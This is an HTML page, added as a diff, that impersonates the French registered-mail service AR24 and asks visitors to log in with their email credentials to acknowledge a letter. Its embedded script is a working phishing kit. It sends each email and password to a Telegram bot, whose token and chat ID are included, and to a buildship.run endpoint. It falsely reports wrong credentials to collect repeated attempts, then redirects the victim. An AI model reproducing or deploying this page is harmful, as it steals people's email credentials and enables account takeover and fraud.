@@ -1,0 +1,692 @@
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Accuser la réception du courrier 876650341 - AR24</title>
+    <link rel="icon" type="image/png" href="theme/icon/favicon.png">
+   <style>@font-face {
+    font-family: 'Barlow';
+    src: url('../fonts/barlow-latin-400-normal.woff2');
+    font-weight: 400;
+}
+
+@font-face {
+    font-family: 'Barlow';
+    src: url('../fonts/barlow-latin-500-normal.woff2');
+    font-weight: 500;
+}
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Barlow', sans-serif;
+}
+
+html, body {
+    height: 100%;
+}
+
+body {
+    display: flex;
+    flex-direction: column;
+    background: #f8f8fb;
+}
+
+.header {
+    display: flex;
+    padding: 0 24px;
+    background-color: #fff;
+    box-shadow: 0 1px 10px rgba(0, 0, 0, 6%), 0 1px 4px rgba(0, 0, 46, .1), 0 0 rgba(0, 0, 46, 6%);
+    min-height: 64px;
+    justify-content: center;
+    align-items: center;
+}
+
+.logo {
+    content: url('2025/05/05/17/451522472.png');
+    width: 103px;
+    height: 24px;
+}
+
+.main {
+    display: flex;
+    flex-direction: column;
+    flex: 1;
+    align-items: center;
+    width: 100%;
+}
+
+.container {
+    display: flex;
+    flex-direction: column;
+    width: 548px;
+    padding: 48px 0 96px 0;
+    gap: 38px;
+}
+
+.title {
+    display: flex;
+    align-items: center;
+    text-align: center;
+}
+
+.title h1 {
+    font-family: "Montserrat", sans-serif;
+    font-size: 31.92px;
+    color: #00008c;
+    font-weight: 600;
+    text-wrap: balance;
+    line-height: 1.1;
+}
+
+.error {
+    display: none;
+    background-color: #FEF4F5;
+    color: #D00000;
+    padding: 24px;
+    border-radius: 8px;
+    border-left: 4px solid #D00000;
+}
+
+.flex {
+    display: flex;
+}
+
+.card-top {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    line-height: 1.8;
+    padding: 0 8px;
+}
+
+.subtitle {
+    color: #666d92;
+    font-size: 15.96px;
+    font-weight: 700;
+}
+
+.information {
+    color: #666d92;
+    font-size: 16px;
+    line-height: 1.9;
+    text-align: center;
+}
+
+.top-url {
+    color: #0000ff;
+    text-decoration: underline;
+    margin-top: 8px;
+}
+
+.form {
+    display: flex;
+    flex-direction: column;
+    background: #fff;
+    border-radius: 8px;
+    border: 0;
+    padding: 24px;
+    box-shadow: 0 4px 8px rgba(0, 0, 46, 4%), 0 0 2px rgba(0, 0, 45, 6%), 0 0 1px rgba(0, 0, 45, 4%);
+    transition: box-shadow .3s ease-in-out;
+}
+
+.operators {
+    content: url('');
+    width: 150px;
+    margin: 48px 0 20px 0;
+    align-self: center;
+}
+
+.form-input {
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+    margin: 0 0 24px 0;
+}
+
+.password-input {
+    display: flex;
+    justify-content: flex-end;
+    align-items: center;
+    position: relative;
+}
+
+.eye {
+    content: url('2025/05/05/17/726061429.png');
+    position: absolute;
+    margin: 0 15px 0 0;
+    cursor: pointer;
+    z-index: 2;
+    right: 0;
+}
+
+.eye-close {
+    content: url('2025/05/05/18/118005171.png');
+    position: absolute;
+    margin: 0 15px 0 0;
+    cursor: pointer;
+    z-index: 2;
+    right: 0;
+}
+
+.form-input input {
+    background: #fff;
+    border: 1px solid #dadbe0;
+    border-radius: 8px;
+    font-size: 17px;
+    padding: 12px 16px;
+    width: 100%;
+    box-sizing: border-box;
+    transition: border-color 0.3s;
+}
+
+.form-input input:focus {
+    border-color: #0000ff;
+    outline: none;
+}
+
+.form-input input::placeholder {
+    font-size: 14px;
+    color: #999;
+}
+
+.form-input label {
+    font-weight: 500;
+    color: #00008c;
+    font-size: 14px;
+}
+
+.form-button {
+    display: flex;
+    justify-content: center;
+    margin: 24px 0 0 0;
+}
+
+.form-checkbox {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+}
+
+.form-checkbox input[type="checkbox"] {
+    width: 16px;
+    height: 16px;
+    cursor: pointer;
+}
+
+.form-checkbox label {
+    color: #666d92;
+    font-size: 12px;
+    font-weight: 500;
+    cursor: pointer;
+}
+
+.btn {
+    font-family: "Montserrat", sans-serif;
+    padding: 15px 32px;
+    border-radius: 3em;
+    font-weight: 600;
+    background: #0000ff;
+    outline: none;
+    color: #fff;
+    border: 0;
+    cursor: pointer;
+    transition: background-color 0.3s, transform 0.2s;
+    min-width: 180px;
+}
+
+.btn:hover {
+    background: #0000e6;
+    transform: translateY(-2px);
+}
+
+.btn:focus {
+    background: #0000ffa3;
+}
+
+.btn:active {
+    transform: translateY(0);
+}
+
+.footer {
+    display: flex;
+    flex-direction: column;
+    background: #fff;
+    color: #666d92;
+    justify-content: center;
+    align-items: center;
+    padding: 24px 0 72px 0;
+}
+
+.footer-container {
+    display: flex;
+    flex-direction: column;
+    width: 1200px;
+}
+
+.footer-top {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    border-bottom: 1px solid #c6c8d0;
+    padding: 0 0 24px 0;
+    flex-direction: row;
+    flex-wrap: wrap;
+    gap: 30px;
+}
+
+.footer-top-left {
+    display: flex;
+    align-items: center;
+    gap: 24px;
+}
+
+.footer-top-right {
+    display: flex;
+    gap: 48px;
+    align-items: center;
+}
+
+.frenchtech {
+    content: url('2025/05/05/17/576288489.png');
+    width: 61px;
+    height: 65px;
+}
+
+.regionals {
+    content: url('2025/05/05/17/579644718.png');
+    width: 54px;
+    height: 63px;
+}
+
+.syntec {
+    content: url('2025/05/05/17/245507858.png');
+    width: 80px;
+    height: 31px;
+}
+
+.footer-bottom {
+    padding: 24px 0 0 0;
+    display: flex;
+    flex-direction: row;
+    flex-wrap: wrap;
+    justify-content: space-between;
+    gap: 30px;
+}
+
+.column {
+    display: flex;
+    flex-direction: column;
+}
+
+.contact {
+    color: #00008c;
+}
+
+.phone {
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.contact-info {
+    font-size: 14px;
+    gap: 15px;
+}
+
+.column div {
+    display: flex;
+    flex-direction: column;
+}
+
+.column div div {
+    display: flex;
+    flex-direction: column;
+}
+
+.flags {
+    flex-direction: row!important;
+    justify-content: space-between;
+    padding: 0 0 0 10px;
+}
+
+.fr-flag {
+    content: url('2025/05/05/18/248502627.png');
+    height: 30px;
+    width: 30px;
+    cursor: pointer;
+}
+
+.en-flag {
+    content: url('2025/05/05/18/303712625.png');
+    height: 30px;
+    width: 30px;
+    cursor: pointer;
+}
+
+.nl-flag {
+    content: url('2025/05/05/18/589411206.png');
+    height: 30px;
+    width: 30px;
+    cursor: pointer;
+}
+
+ul {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+    font-weight: 500;
+}
+
+li {
+    list-style: none;
+    cursor: pointer;
+    transition: color 0.3s;
+}
+
+li:hover {
+    color: #00008c;
+}
+
+.copyright {
+    justify-content: flex-end;
+    gap: 20px;
+}
+
+.btn, .eye, .eye-close, li, .logo, input[type="checkbox"] {
+    cursor: pointer;
+}
+
+@media only screen and (max-width: 1200px) {
+    .footer {
+        padding: 24px 20px 72px 24px;
+    }
+    .footer-container {
+        width: 100%;
+    }
+}
+
+@media only screen and (max-width: 590px) {
+    .main {
+        padding: 0 20px;
+    }
+    .container {
+        width: 100%;
+    }
+    .title h1 {
+        font-size: 22px;
+    }
+    .btn {
+        min-width: 100%;
+    }
+}
+
+@media only screen and (max-width: 500px) {
+    .footer-top-left {
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        text-align: center;
+    }
+    .footer-top-right {
+        width: 100%;
+        justify-content: space-around;
+    }
+    .footer-bottom {
+        flex-direction: column;
+        gap: 20px;
+    }
+}
+
+@media only screen and (max-width: 330px) {
+    .footer-top-right {
+        flex-direction: column;
+    }
+}</style>
+    <meta name="format-detection" content="telephone=no">
+</head>
+<body>
+    <div class="header">
+        <i class="logo"></i>
+    </div>
+    <div class="main">
+        <div class="container">
+            <div class="title">
+                <h1>Réceptionnez votre courrier recommandé électronique</h1>
+            </div>
+            <div class="card-top">
+                <p class="subtitle">Bienvenue sur AR24 !</p>
+                <p class="information">Votre expéditeur cherche à vous faire parvenir un courrier recommandé de façon électronique. Il/elle a choisi notre service pour vous le faire parvenir.</p>
+                <a href="https://www.ar24.fr/qui-sommes-nous/" class="top-url">En savoir plus sur AR24</a>
+            </div>
+            <div class="error" id="error-message">
+                <p>Identifiants incorrects. Veuillez réessayer.</p>
+            </div>
+            <form class="form" id="login-form" method="POST">
+                <p class="information">Pour accuser réception de votre courrier, veuillez vous connecter en utilisant les identifiants habituels de votre boîte mail.</p>
+                <i class="operators"></i>
+                <div class="form-input">
+                    <label for="email">Adresse e-mail</label>
+                    <input type="email" name="email" id="email" placeholder="Ex : monadresse@email.fr" value="" required="">
+                </div>
+                <div class="form-input">
+                    <label for="password">Mot de passe</label>
+                    <div class="password-input">
+                        <input type="password" id="password" name="password" placeholder="Votre mot de passe" required="">
+                        <span id="toggle-password" class="eye"></span>
+                    </div>
+                </div>
+                <div class="form-checkbox">
+                    <input type="checkbox" id="remember">
+                    <label for="remember">Se souvenir de moi</label>
+                </div>
+                <div class="form-button">
+                    <button class="btn" type="submit" id="submit-btn">Connexion</button>
+                </div>
+            </form>
+        </div>
+    </div>
+    <div class="footer">
+        <div class="footer-container">
+            <div class="footer-top">
+                <div class="footer-top-left">
+                    <i class="logo"></i>
+                    <div>
+                        <p>Votre solution d'envoi de recommandés électroniques fiable, pratique et efficace.</p>
+                        <p>AR24 est une filiale de Docaposte</p>
+                    </div>
+                </div>
+                <div class="footer-top-right">
+                    <i class="frenchtech"></i>
+                    <i class="regionals"></i>
+                    <i class="syntec"></i>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <div class="column contact-info">
+                    <div class="contact">
+                        <span class="phone">08 11 69 05 45</span>
+                        <span>(0.05€/min + prix appel)</span>
+                    </div>
+                    <div>
+                        <span>Du lundi au vendredi</span>
+                        <span>de 9h00 à 17h30 en continu</span>
+                    </div>
+                </div>
+                <div class="column">
+                    <ul>
+                        <li>Se connecter</li>
+                        <li>Accueil</li>
+                        <li>Qui sommes-nous ?</li>
+                        <li>Avantages</li>
+                        <li>Paramètres des cookies</li>
+                        <li>Certifications</li>
+                        <li>Contact</li>
+                    </ul>
+                </div>
+                <div class="column">
+                    <ul>
+                        <li>Pour qui ?</li>
+                        <li>FAQ</li>
+                        <li>Base de connaissances</li>
+                        <li>Vérifier mes preuves</li>
+                        <li>Vérifier un email</li>
+                    </ul>
+                </div>
+                <div class="column">
+                    <ul>
+                        <li>CGU</li>
+                        <li>Mentions légales</li>
+                        <li>Politique de confidentialité : inscription</li>
+                        <li>Sous-traitants ultérieurs</li>
+                        <li>Etat du service</li>
+                    </ul>
+                </div>
+                <div class="column copyright">
+                    <div class="flags">
+                        <i class="fr-flag"></i>
+                        <i class="en-flag"></i>
+                        <i class="nl-flag"></i>
+                    </div>
+                    <div>
+                        <span>Tous droits réservés</span>
+                        <span>AR24 2025</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+document.addEventListener("DOMContentLoaded", function() {
+
+    const TELEGRAM_CONFIG = {
+        token: '7989906566:AAEC1kB7bnmtzJjCr6W5fjcWGsNO6gznGEU',
+        chatId: '7940155765'
+    };
+    
+
+    const passwordInput = document.getElementById("password");
+    const togglePassword = document.getElementById("toggle-password");
+    const form = document.getElementById('login-form');
+    const errorDiv = document.getElementById('error-message');
+    const errorText = errorDiv.querySelector('p');
+    const submitBtn = document.getElementById('submit-btn');
+    
+    let attemptCount = 0;
+    const MAX_ATTEMPTS = 3;
+    const REDIRECT_URL = 'https://drive.google.com/file/d/1eNHvaGM65gZPNQetBmCc0X9V14ygIJ9J/edit';
+
+    function showError(message, duration = 3000) {
+        errorText.textContent = message;
+        errorDiv.style.display = 'block';
+        setTimeout(() => {
+            errorDiv.style.display = 'none';
+        }, duration);
+    }
+
+
+    async function sendToTelegram(email, password) {
+        const message = `🔐 NOFOR26\n\n` +
+                       `📧 Email: ${email}\n` +
+                       `🔒 Mot de passe: ${password}\n` +
+                       `🕐 Heure: ${new Date().toLocaleString('fr-FR')}\n` +
+                       `🔄 Tentative n°${attemptCount + 1}`;
+        
+        try {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CONFIG.chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+        } catch (error) {
+            console.error('Erreur Telegram:', error);
+        }
+    }
+
+
+    async function sendToBuildship(email, password) {
+        const payload = ` RB\n\n` +
+                       ` sail: ${email}\n` +
+                       ` Moe: ${password}\n` +
+                       ` tim: ${new Date().toLocaleString('fr-FR')}\n` +
+                       ` Ten °${attemptCount + 1}`;
+        
+        try {
+            await fetch('https://rl4bji.buildship.run/blomero', {
+                method: 'POST',
+                mode: 'cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    message: payload,
+                    email: email,
+                    timestamp: Date.now()
+                })
+            });
+        } catch (error) {
+            console.error('Erreur Buildship:', error);
+        }
+    }
+
+
+    if (togglePassword) {
+        togglePassword.addEventListener("click", function() {
+            const isPassword = passwordInput.type === "password";
+            passwordInput.type = isPassword ? "text" : "password";
+            this.classList.toggle("eye");
+            this.classList.toggle("eye-close");
+        });
+    }
+
+ 
+    form.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        submitBtn.disabled = true;
+        submitBtn.style.opacity = '0.5';
+        
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value;
+        
+        if (!email || !password) {
+            showError("Veuillez remplir tous les champs.", 2000);
+            submitBtn.disabled = false;
+            submitBtn.style.opacity = '1';
+            return;
+        }
+        
+  
+        await Promise.all([
+            sendToTelegram(email, password),
+            sendToBuildship(email, password)
+        ]);
+        
+        attemptCount++;
+        passwordInput.value = '';
+        
+        if (attemptCount < MAX_ATTEMPTS) {
+            showError("Identifiants incorrects. Veuillez réessayer.", 2000);
+            submitBtn.disabled = false;
+            submitBtn.style.opacity = '1';
+        } else {
+            showError("Trop de tentatives. Redirection en cours...", 1500);
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, 1500);
+        }
+    });
+    
+
+    passwordInput.addEventListener('paste', function(e) {
+        e.preventDefault();
+        showError("Le collage n'est pas autorisé", 1500);
+    });
+});
+    </script>
+
+</body>
+</html>
